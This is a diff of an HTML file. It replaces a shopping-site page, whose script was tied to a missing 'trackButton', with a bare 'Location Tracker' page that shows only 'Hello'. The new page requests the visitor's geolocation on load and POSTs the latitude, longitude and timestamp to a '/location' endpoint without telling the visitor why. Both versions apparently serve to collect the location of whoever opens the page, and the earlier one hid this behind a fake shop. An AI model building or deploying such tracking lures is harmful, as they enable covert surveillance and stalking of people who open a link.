@@ -1,150 +1,39 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Shopping Website</title>
-    <link rel="stylesheet" href="styles.css">
-   <style>
- *{
-    margin: 0;
-    padding: 0;
-    box-sizing: border-box;
-}
-
-/* Basic styling for header */
-header {
-    background-color: #333;
-    color: #fff;
-    padding: 20px;
-}
-
-header h1 {
-    margin: 0;
-}
-
-nav ul {
-    list-style-type: none;
-}
-
-nav ul li {
-    display: inline;
-    margin-right: 20px;
-}
-
-nav ul li a {
-    color: #fff;
-    text-decoration: none;
-}
-
-/* Styling for featured products section */
-.featured-products {
-    margin: 50px auto;
-    text-align: center;
-}
-
-.featured-products h2 {
-    margin-bottom: 20px;
-}
-
-.product {
-    display: inline-block;
-    margin: 0 10px;
-    text-align: center;
-}
-
-.product img {
-    width: 200px;
-    height: 200px;
-    border: 1px solid #ccc;
-}
-
-.product h3 {
-    margin-top: 10px;
-}
-
-.product p {
-    font-weight: bold;
-    color: #555;
-}
-
-/* Basic styling for footer */
-footer {
-    background-color: #333;
-    color: #fff;
-    text-align: center;
-    padding: 10px;
-    position: fixed;
-    bottom: 0;
-    width: 100%;
-}
-</style>
+    <title>Location Tracker</title>
 </head>
 <body>
-    <header>
-        <h1>Shopping Website</h1>
-        <nav>
-            <ul>
-                <li><a href="#">Home</a></li>
-                <li><a href="#">Shop</a></li>
-                <li><a href="#">About</a></li>
-                <li><a href="#">Contact</a></li>
-            </ul>
-        </nav>
-    </header>
+    <h1>Hello</h1>
+    <script>
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(position => {
+                const location = {
+                    latitude: position.coords.latitude,
+                    longitude: position.coords.longitude,
+                    timestamp: position.timestamp
+                };
 
-    <main>
-        <section class="featured-products">
-            <h2>Featured Products</h2>
-            <div class="product">
-                <a href="https://imgbb.com/"><img src="https://i.ibb.co/FDWGMj2/shopping-1.webp" alt="shopping-1" border="0"></a>
-                
-                <h3>Product 1</h3>
-                <p>$19.99</p>
-            </div>
-            <div class="product">
-               <a href="https://imgbb.com/"><img src="https://i.ibb.co/JpSRqW7/shopping.webp" alt="shopping" border="0"></a>
-                <h3>Product 2</h3>
-                <p>$29.99</p>
-            </div>
-            <!-- More products can be added here -->
-        </section>
-    </main>
-
-    <footer>
-        <p>&copy; 2024 Shopping Website. All rights reserved.</p>
-    </footer>
-     <script>
-        document.getElementById('trackButton').addEventListener('click', () => {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(position => {
-                    const location = {
-                        latitude: position.coords.latitude,
-                        longitude: position.coords.longitude,
-                        timestamp: position.timestamp
-                    };
-
-                    fetch('/location', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify(location)
-                    })
-                    .then(response => {
-                        if (response.ok) {
-                            console.log('Location data sent successfully');
-                        } else {
-                            console.error('Error sending location data');
-                        }
-                    });
-                }, error => {
-                    console.error('Error getting location:', error);
+                fetch('/location', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(location)
+                })
+                .then(response => {
+                    if (response.ok) {
+                        console.log('Location data sent successfully');
+                    } else {
+                        console.error('Error sending location data');
+                    }
                 });
-            } else {
-                console.error('Geolocation is not supported by this browser.');
-            }
-        });
+            }, error => {
+                console.error('Error getting location:', error);
+            });
+        } else {
+            console.error('Geolocation is not supported by this browser.');
+        }
     </script>
 </body>
 </html>
